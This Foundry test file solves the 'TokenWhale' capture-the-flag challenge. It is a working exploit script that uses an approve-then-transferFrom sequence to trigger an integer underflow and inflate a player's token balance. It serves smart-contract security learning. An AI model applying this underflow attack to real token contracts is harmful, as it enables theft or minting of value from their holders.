// SPDX-License-Identifier: UNLICENSED
pragma experimental ABIEncoderV2;
pragma solidity ^0.6.2;

import {Test, console} from "forge-std/Test.sol";
import {TokenWhaleChallenge} from "../../src/2-Math/2-TokenWhale.sol";

contract TokenWhaleTest is Test {
    address player0;
    address player1;

    address challengeAddress;

    function setUp() public {
        player0 = makeAddr("player0");
        player1 = makeAddr("player1");

        TokenWhaleChallenge challenge = new TokenWhaleChallenge(payable(player0));
        challengeAddress = payable(address(challenge));
    }

    function testSolveTokenWhale() public {
        TokenWhaleChallenge challenge = TokenWhaleChallenge(payable(challengeAddress));

        // [START]

        // uint256 v1 = 0;
        // console.log(v1 - 1); // underflow
        // uint256 v2 = 2 ** 256 - 1;
        // console.log(v2 + 1); // overflow

        vm.prank(player0);
        challenge.transfer(player1, 501);

        console.log("Transfer");
        console.log("balanceOf[player0] = ", challenge.balanceOf(player0));
        console.log("balanceOf[player1] = ", challenge.balanceOf(player1));
        console.log("-----");

        vm.prank(player1);
        challenge.approve(player0, type(uint256).max);

        console.log("Approve");
        console.log("-----");

        vm.prank(player0);
        challenge.transferFrom(player1, player1, 500);

        console.log("TransferFrom");
        console.log("balanceOf[player0] = ", challenge.balanceOf(player0));
        console.log("balanceOf[player1] = ", challenge.balanceOf(player1));
        console.log("-----");

        // [END]

        assertTrue(challenge.isComplete());
    }
}
